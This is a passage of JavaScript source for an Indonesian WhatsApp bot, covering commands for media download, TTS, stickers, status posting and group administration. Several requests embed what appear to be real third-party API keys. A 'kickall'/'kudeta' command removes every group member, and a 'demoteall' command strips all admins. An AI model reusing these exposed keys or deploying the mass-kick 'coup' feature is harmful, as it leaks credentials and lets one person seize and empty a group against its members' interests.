       if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
  	if (!args[0]) return reply(`Enter the mediafire link next to the command`)
    if (!args[0].match(/mediafire/gi)) return reply(`Link incorrect`)
    const { mediafiredl } = require('@bochilteam/scraper')
    let full = /f$/i.test(command)
    let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
    let res = await mediafiredl(args[0])
    let { url, url2, filename, ext, aploud, filesize, filesizeH } = res
    let caption = `
   ≡ *MEDIAFIRE*

▢ *Number:* ${filename}
▢ *Size:* ${filesizeH}
▢ *Extension:* ${ext}
▢ *Uploaded:* ${aploud}
`.trim()
    slime.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
    }
    break
    case 'qc': {
                
const { quote } = require('./lib/quote.js')
let text
if (args.length >= 1) {
text = args.slice(0).join(" ")
} else if (m?.quoted && m?.quoted.text) {
text = m?.quoted.text
} else m?.reply("Input teks atau replyq teks yang ingin di jadikan quote!")
if (!text) return m?.reply('masukan text')
if (text.length > 100) return m?.reply('Maksimal 100 Teks!')
let ppnyauser = await await slime.profilePictureUrl(m?.sender, 'image').catch(_=> 'https://telegra.ph/file/320b066dc81928b782c7b.png')
const rest = await quote(text, pushname, ppnyauser)
slime.sendImageAsSticker(m?.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
    


         case "tts":
        {
        if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
          if (!text) return m?.reply(`[ ! ] ${prefix}${command} halo world`);
          const a = await (
            await axios.post(
              "https://gesserit.co/api/tiktok-tts",
              { text: text, voice: "id_001" },
              {
                headers: {
                  Referer: "https://gesserit.co/tiktok",
                  "User-Agent":
                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                  responseType: "arraybuffer",
                },
              },
            )
          ).data;
          const b = Buffer.from(a.audioUrl);
          slime.sendMessage(m?.chat, {
            audio: Buffer.from(a.audioUrl.split("base64,")[1], "base64"),
            mimetype: "audio/mpeg",
          });
        }
        break;
                 case 'vn':
        {
        if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
          if (!text) return m?.reply(`[ ! ] ${prefix}${command} halo world`);
          const a = await (
            await axios.post(
              "https://gesserit.co/api/tiktok-tts",
              { text: text, voice: "id_001" },
              {
                headers: {
                  Referer: "https://gesserit.co/tiktok",
                  "User-Agent":
                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                  responseType: "arraybuffer",
                },
              },
            )
          ).data;
          const b = Buffer.from(a.audioUrl);
                    slime.sendMessage(m?.chat, {
            audio: Buffer.from(a.audioUrl.split("base64,")[1], "base64"),
            mimetype: 'audio/mp4',
            ptt: true,
          });
        }
        break;
                case 'tiktokstalk':{
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
if (!q) return reply(`Example: ${prefix+command} username`)
slime.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://api.junn4.my.id/tools/tiktokstalk?username=${q}`)
const nick = anu.result.name
const username = anu.result.username
const foll = anu.result.followers
const foli = anu.result.following
const desk = anu.result.description
await slime.sendMessage(m.chat, { image: { url: anu.result.pp_user}, caption: `Name : ${nick}\nUsername : ${username}\nFollowers : ${foll}\nFollowing : ${foli}\nDescription : ${desk}`}, {quoted: m})
await slime.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}catch (error) {
reply(`Error!\nPastikan username sama persis dan akun tidak di privat.`);
}
}

break          
case "kalkulator":  
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
 if (!text) return reply(`Lah Mana`)
let val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
  let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
  try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
reply(`*${format}* = _${result}_`)
  } catch (e) {
if (e == undefined) throw 'Isinya?'
throw 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport'
  }
  break
//=================== G R O U P =====================//
case 'totag': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
if (!(isAdmins || isCreator)) return reply(mess.admin)
if (!m.quoted) return `Reply pesan dengan caption ${prefix + command}`
slime.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
}
break
case 'linkgroup': case 'linkgc': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
await loading()
let response = await slime.groupInviteCode(from)
slime.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'resetlinkgc': {
if (!(isAdmins || isCreator)) return reply(mess.admin)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
await loading()
slime.groupRevokeInvite(from)
}
break
case 'sendlinkgc': {
if (!(isAdmins || isCreator)) return reply(mess.admin)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
await loading()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await slime.groupInviteCode(from)
slime.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'kickall': case 'kudeta': {
if (!m.isGroup) return m.reply("Khusus Group\n\nSilahkan join group bot : https://linktr.ee/slimextzy")
if (!isCreator) return reply(mess.owner)
if (!isBotAdmins) return reply(mess.botAdmin)
  const kickall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${owner}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${owner}@s.whatsapp.net`)
      .map(item => item.id);
 if (global.welcome === true) {
 welcome = false;
  }
 for (let remove of kickall) {
 await slime.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
 await sleep(100);
 }
 m.reply(`Success`);
}
break
case 'kick': {
if (!(isAdmins || isCreator || isPrem)) return m.reply(mess.admin)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await slime.groupParticipantsUpdate(from, [users], 'remove')
reply(mess.done)
}
break
case 'add': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await slime.groupParticipantsUpdate(from, [users], 'add')
reply(mess.done)
}
break
case 'demoteall': {
 if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
 if (!isCreator) return reply('Khusus Owner')
 if (!isBotAdmins) return reply('Bot harus admin')
  const xeondemoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `6283167532721@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `6283167532721@s.whatsapp.net`)
      .map(item => item.id);
 for (let demote of xeondemoteall) {
 await slime.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${demote}@s.whatsapp.net` : demote], "demote");
 await sleep(100);
 }
 reply(`Success`);
}
break
case 'promoteall': {
 if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
 if (!isCreator) return reply('Khusus Owner')
 if (!isBotAdmins) return reply('Bot harus admin')
  const xeonpromoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `6283167532721@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `6283167532721@s.whatsapp.net`)
      .map(item => item.id);
 for (let promote of xeonpromoteall) {
 await slime.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${promote}@s.whatsapp.net` : promote], "promote");
 await sleep(100);
 }
 reply(`Success`);
}
break

/*
This feature using APIs from ai.xterm.codes
*/

case 'lora': {
    let [text1, text2] = text.split("|")
    console.log({ text1, text2 })
    
    if (!text1 || !text2) {
        return reply(`*Here is Tutorial!*\n\n*Pay attention to the following instructions!*\n[ StableDiffusion - Lora++ ]\n\nUsage: <prefix><command> <ID>|<prompt>\nExample: #lora 3|beautiful cat with aesthetic jellyfish, sea god theme\n\n => _ID is the number of models available in the list_\n\n_*please see the list of available models:*_\n\n*[ID] [NAME]*\n \n[1] [Donghua#01]\n[2] [YunXi - PerfectWorld]\n[3] [Sea God (Tang San) - Douluo Dalu]\n[4] [XiaoYiXian - Battle Through the Heavens]\n[5] [God of Angels (Xian Renxue) - Douluo Dalu]\n[6] [Sheng Cai'er - Throne of Seals]\n[7] [HuTao - Genshin Impact]\n[8] [TangWutong - Unrivaled Tang Sect]\n[9] [CaiLin (Medusa) - Battle Through the Heavens]\n[10] [Elaina - Majo No TabiTabi]\n[11] [Jiang Nanan - The Unrivaled Tang Sect]\n[12] [Cailin (Queen Medusa) - BTTH [ 4KUltraHD]]\n[13] [MaXiaoTao - The Unrivaled Tang Sect]\n[14] [Yor Forger - Spy x Family]\n[15] [Boboiboy Galaxy]\n[16] [Hisoka morow]\n[17] [Ling Luochen - Unrivaled Tang Sect]\n[18] [Tang Wutong - Unrivaled Tang Sect]\n[19] [Huo Yuhao - Unrivaled Tang Sect]`)
    }

    let imageUrl = `https://ai.xterm.codes/api/text2img/instant-lora?id=${encodeURIComponent(text1)}&prompt=${encodeURIComponent(text2)}&key=Bell409`
    
    await slime.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m })
}
break
case "jadinyata":
case "toreal": {
   if (!quoted) return reply(`Fotonya Mana?`);
  if (!/image/.test(mime)) return reply(`Kirim/Balas Foto dengan Caption ${prefix + command}`);
  reply(mess.wait);
  let tryng = 0;
  const media = await slime.downloadAndSaveMediaMessage(quoted);
  let pok = await TelegraPh(media);
    try {
    let ai = await fetch(`https://ai.xterm.codes/api/img2img/filters?action=anime2real&url=${pok}&key=Bell409`).then(a => a.json());
      if (!ai.status) return ai;
  console.log(ai);
        while (tryng < 55) {
      let s = await fetch(`https://ai.xterm.codes/api/img2img/filters/batchProgress?id=${ai.id}`).then(a => a.json());
      if (s.status === 1) {
      console.log("Starting...");
    } 
     if (s.status === 2) {
      console.log("Processing...");
    } 
      if (s.status == 3) {
        return slime.sendMessage(m.chat, { image: { url: s.url } }, { quoted: m });
      }
            if (s.status == 4) {
        return reply("Maaf terjadi kesalahan. Coba gunakan gambar lain!");
      }
            await new Promise(resolve => setTimeout(resolve, 2000));
    }
  } catch (e) {
    console.error(e);
    reply(`Type-Err! :\n${e}`);
  }
}
break;
case 'promote': {
if (!(isAdmins || isCreator || isPrem)) return m.reply(mess.admin)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await slime.groupParticipantsUpdate(from, [users], 'promote')
reply(mess.done)
}
break
case 'demote': {
if (!(isAdmins || isCreator || isPrem)) return m.reply(mess.admin)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await slime.groupParticipantsUpdate(from, [users], 'demote')
reply(mess.done)
}
break
case 'totag': {
if (!m.isGroup) return reply(mess.group)
if (!(isCreator || isAdmins)) return reply(`Khusus admin`)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
               if (!m.quoted) return reply(`Reply message with caption ${prefix + command}`)
               slime.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break
case 'everyone': 
        if (!(isCreator || isAdmins)) return
 slime.sendMessage(m.chat, {
text: "@" + m.chat,
contextInfo: {
mentionedJid: (await (await slime.groupMetadata(m.chat)).participants).map(a => a.id),
groupMentions: [
{
groupJid: m.chat,
groupSubject: 'everyone' 
}
]
}
}
)
   setTimeout(async () => {
           reply(`${pushname} menggunakan ${command} untuk memanggil kalian`)
            }, 1120)
        break    
case 'hidetag': case 'h': {
if (!(isCreator || isAdmins)) return reply(`Khusus admin`)
if (!m.isGroup) return reply(mess.group)
let tek = m.quoted ? quoted.text : (text ? text : "")
const fkontak = {
	"key": {
    "participants":"0@s.whatsapp.net",
		"remoteJid": "status@broadcast",
		"fromMe": false,
		"id": "Halo"
	},
	"message": {
		"contactMessage": {
			"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
		}
	},
	"participant": "0@s.whatsapp.net"
}

    slime.sendMessage(m.chat, { text: text, mentions: participants.map(a => a.id) }, {quoted:fkontak})
    }
break
break
 case 'listonline':
            case 'liston': {
                if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
                let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                let online = [...Object.keys(store.presences[id]), botNumber]
                slime.sendText(m.chat, '⏰ List Online:\n\n' + online.map(v => '🌱 @' + v.replace(/@.+/, '')).join`\n`, m, {
                    mentions: online
                })
            }
            break
            case 'tagadmin': {
const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    if (!m.isGroup) return reply('Fitur Khusus Group!\n\nSilahkan join group bot : https://linktr.ee/slimextzy')
    let text = `*「 Group TagAdmin 」*\n

*Group Admins:*
${listAdmin}
`.trim()
    slime.sendMessage(m.chat, ppnyauser, 'pp.jpg', text, m, false, { mentions: [...groupAdmins.map(v => v.id), owner] })
}
break
case 'tagall': {
if (!isAdmins) return reply(mess.admin)
if (!m.isGroup) return
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
slime.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:fcall })
}
break
case 'totalfeature':{
let totalf = `
*TOTAL FEATURE*

> • Total ${totalFitur()} Fitur\n> • Tipe : Case

Silahkan ketik *.menu* untuk
Menampilkan menu utama`
reply(totalf)
}
break
case 'closetime':
if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
if (!isBotAdmins) return reply(mess.badm)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return m.reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
m.reply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* group ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
slime.groupSettingUpdate(from, 'announcement')
m.reply(close)
}, timer)
break
  
case 'opentime':
if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
if (!isBotAdmins) return reply(mess.badm)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return m.reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
m.reply(`Open time ${q} dimulai dari sekarang`)
setTimeout( () => {
const open = `*Tepat waktu* group dibuka oleh admin\n sekarang member dapat mengirim pesan`
slime.groupSettingUpdate(from, 'not_announcement')
m.reply(open)
}, timer)
break
//=================================================//
case 'hdvid' :
case 'vidhd' :{
  try {
const media = await slime.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh(media)
const response = await fetch(`https://api.alyachan.dev/api/vid-enhance?video=${anuu}&apikey=zCQtoY`)
const hasil = await response.json();
const vidhd = hasil.data.url;
const caption = `sukses membuat video menjadi hd\ndurasi: ${hasil.data.duration}\nsize: ${hasil.data.size}`
slime.sendMessage(m.chat, { caption: caption, video: { url: vidhd }}, {quoted:m});
		} catch (e) {
			console.log(e)
			reply(`Terjadi kesalahan, coba lagi nanti.`)
		}
}
break
case 'hdr': case 'remini': case 'hd': {
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
			if (!quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
			reply(mess.wait)
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			slime.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: fcall})
			}
			break
case 'getcase': {

const getCase = (cases) => {

            return "case "+`'${cases}'`+fs.readFileSync("./hanako.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"

        }
            try{

                if (!isCreator) return reply('ngapain')

                if (!q) return reply(`contoh : ${prefix + command} antilink`)

                let nana = await getCase(q)

                reply(nana)

            } catch(err){

            console.log(err)

            reply(`Case ${q} tidak di temukan`)

        }
}
        break 
        
        case 'daftar': case 'regis': case 'register': {
if (isRegistered) return reply('Kamu sudah terdaftar')
const serialUser = createSerial(20)
mzd = `「 SUCCES TERDAFTAR 」

  • Phone Number : @${m?.sender.split('@')[0]}
  • Name User : ${pushname}
  • Status Verify : Berhasil

_*Done Bwang Kamu Sekarang Sudah Bisa Mengakses Hanako Ai Abangkuhh Btw Limit Akan Di Reset Setiap Harinya, Tapi Jika Kamu Ingin Membeli Limit Silahkan Hubungi*_ .owner`
veri = m?.sender
if (!m.isGroup) {
addRegisteredUser(m?.sender, pushname, serialUser)
slime.sendMessage(m?.chat, {
text: mzd,
contextInfo: {
mentionedJid: [m?.chat],
externalAdReply: {
showAdAttribution: true,
title: `R E G I S T E R E D`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
} else {
addRegisteredUser(m?.sender, pushname, serialUser)
slime.sendMessage(m?.chat, {
text: mzd,
contextInfo: {
mentionedJid: [m?.chat],
externalAdReply: {
showAdAttribution: true,
title: `© 2024 | R E G I S T E R`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
}
break
        
case 'biochange': {
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'enable') {
                    autobio = true
                    reply(`Berhasil Mengubah Auto Bio Ke ${q}`)
                } else if (q == 'disable') {
                    autobio = false
                    reply(`Berhasil Mengubah Auto Bio Ke ${q}`)
                }
                }
                break   
case 'readchange': {
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return reply(`Contoh ${prefix + command} enable/disable`)
if (q === 'enable') {
autoread = true
m.reply(`Berhasil mengubah autoread ke ${q}`)
} else if (q === 'disable') {
autoread = false
m.reply(`Berhasil mengubah autoread ke ${q}`)
}
}
break
case 'scolong': case 'wm': {
let teks = `${text}`
{
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await slime.sendImageAsSticker(from, media, m, { packname: `${teks}`, author: `${wm}` })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
let media = await quoted.download()
let encmedia = await slime.sendVideoAsSticker(from, media, m, { packname: `${teks}`, author: `${wm}` })
await fs.unlinkSync(encmedia)
}
}
}
break
case 'sticker': case 's': case 'stickergif': case 'sgif': case 'stiker': {
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await slime.sendImageAsStickerAV(from, media, fcall, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await slime.sendVideoAsSticker(from, media, fcall, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
case 'public': {
if (!isCreator) return reply(mess.owner) 
slime.public = true
reply('_SUCCES MODE PUBLIC BRO_')
}
break
case 'self': {
if (!isCreator) return reply(mess.owner) 
slime.public = false
reply('_SUCCES MODE SELF BRO_')
}
break
case 'profile': case 'me': {
let limitz = db.data.users[m.sender].limit;
let sender = m.sender;
    let ppUrl = await slime.profilePictureUrl(sender, 'image').catch((_) => "https://telegra.ph/file/34d343582a1cf8f830a28.jpg");
    let pp = await (await fetch(ppUrl)).buffer();

    let yyye = `
—  *P R O F I L E*

┌  ◦  *Name* : ${pushname}
│  ◦  *Nomer* : @${m?.sender.split('@')[0]}
│  ◦  *Terdaftar* : Yes
│  ◦  *Status User* : ${isCreator ? 'Premium' : 'Free'}
│  ◦  *Saldo* : Rp ${toRupiah(cekSaldo(sender, db_saldo))}
└  ◦  *Limit* : ${limitz}


*_ᴋᴇᴛɪᴋ .ᴍᴇɴᴜ ᴜɴᴛᴜᴋ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴜᴛᴛᴏɴ ʟɪꜱᴛ_*
*_ᴋᴇᴛᴜᴋ ʙᴜᴛᴛᴏɴ ᴅᴀɴ ᴅɪꜱᴘʟᴀʏ ᴀʟʟᴍᴇɴᴜ_*
*_ᴋᴇᴛɪᴋ .lynnzxd ᴜɴᴛᴜᴋ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀʟʟ ɪɴꜰᴏ_*
*_ᴋᴇᴛɪᴋ .ᴏᴡɴᴇʀ ᴍᴇʟɪʜᴀᴛ ᴋᴏɴᴛᴀᴋ ᴏᴡɴᴇʀ_*
    `.trim();

await slime.sendMessage(m.chat, {
text: yyye,
contextInfo: {
externalAdReply: {  
title: 'ᴄʀᴇᴀᴛᴇᴅ ʙʏ lynnzxd',
body: `AlyaBot`,
thumbnailUrl: ppUrl,
sourceUrl: 'https://lynnzxd.carrd.co/#',
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted:m})
}
break
case 'statusvn': case 'vnsw': {
if (!isCreator) return reply("Owners only")
if (/audio/.test(mime)) {
var audiosw = await slime.downloadAndSaveMediaMessage(quoted)
await slime.sendMessage('status@broadcast', {
audio: {
url: audiosw
},
mimetype: 'audio/mp4',
ptt: true
}, {
backgroundColor: '#FF000000',
statusJidList: Object.keys(global.db.data.users)
})
await reply(mess.success)
} else {
reply('Reply to audio')
}
}
break
case 'upswteks': {
               if (!isCreator) return reply("Owners only")
               if (!q) return reply('Text?')
               await slime.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.data.users) })
               reply(mess.success)
            }
            break
case 'statusvid' : {
if (!isCreator) return reply("Owners only")
if (/video/.test(mime)) {
var videosw = await slime.downloadAndSaveMediaMessage(quoted)
await slime.sendMessage('status@broadcast', {
video: {
url: videosw
},
caption: q ? q : ''
}, {
statusJidList: Object.keys(global.db.data.users)
})
await reply(mess.success)
} else {
reply('Reply to video')
}
}
break
        case "upsw": {
          if (!isCreator) return reply("Owners only");
          if (args.length < 1) return reply("perihal apa?");
          if (/image/.test(mime)) {
            let imgSw = await slime.downloadAndSaveMediaMessage(quoted);
            await slime.sendMessage(
              "status@broadcast",
              { image: { url: imgSw }, caption: q },
              { statusJidList: global.db.data.users },
            );
            reply("Udah Hiyuu, Liat Aja Kalo Ga Percaya 😋");
          } else if (/video/.test(mime)) {
            let VidSw = await slime.downloadAndSaveMediaMessage(quoted);
            await slime.sendMessage(
              "status@broadcast",
              { video: { url: VidSw }, caption: q },
              { statusJidList: global.db.data.users },
            );
            reply("Done");
          } else if (/audio/.test(mime)) {
            let VnSw = await slime.downloadAndSaveMediaMessage(quoted);
            await slime.sendMessage(
              "status@broadcast",
              { audio: { url: VnSw }, mimetype: "audio/mp4", ptt: true },
              { backgroundColor: "#d3d3d3", statusJidList: global.db.data.users }, // #d3d3d3
            );
            reply("Done");
          } else if (q) {
            slime.sendMessage(
              "status@broadcast",
              { text: q },
              {
                backgroundColor: "#FF000000",
                font: 3,
                statusJidList: global.db.data.users,
              },
            );
          } else {
            reply(
              "Replay Media Jika Mau Dengan Caption Ketik .upsw caption",
            );
          }
        }
        break;
        
      case "listsw": {
          if (!isCreator) return reply("Perihal Apa?")
          if (!store.messages["status@broadcast"].array.length === 0)
            throw "Gaada 1 status pun";
          let stories = store.messages["status@broadcast"].array;
          let story = stories.filter(
            (v) => v.message && v.message.protocolMessage?.type !== 0,
          );
          if (story.length === 0) throw "Status gaada";
          const result = {};
          story.forEach((obj) => {
            let participant = obj.key.participant || obj.participant;
            participant = jidNormalizedUser(
              participant === "status_me" ? slime.user.id : participant,
            );
            if (!result[participant]) {
              result[participant] = [];
            }
            result[participant].push(obj);
          });
          let type = (mType) =>
            getContentType(mType) === "extendedTextMessage"
              ? "text"
              : getContentType(mType).replace("Message", "");
          let text = "";
          for (let id of Object.keys(result)) {
            if (!id) return;
            text += `*- ${await slime.getName(id)}*\n`;
            text += `${result[id].map((v, i) => `${i + 1}. ${type(v.message)}`).join("\n")}\n\n`;
          }
          await reply(text.trim(), { mentions: Object.keys(result) });
        }
        break;
case 'emojimix': { 
if (isBan) return m.reply('ʟᴜ ᴅɪ ʙᴀɴ ᴏʟᴇʜ lynnzxd')
await loading()
 let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await slime.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
case 'gcbot': {
reply(`- Gc Utama
https://whatsapp.com/channel/0029VaoNzzlJJhzQTJBL5n0F`)
await slime.sendMessage(m.chat, {audio: fs.readFileSync('./Vn/gcbot.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
//=================================================//
case 'emojimix2': {
if (isBan) return m.reply('ʟᴜ ᴅɪ ʙᴀɴ ᴏʟᴇʜ lynnzxd')
await loading()
 if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await slime.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
if (isBan) return m.reply('ʟᴜ ᴅɪ ʙᴀɴ ᴏʟᴇʜ lynnzxd')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
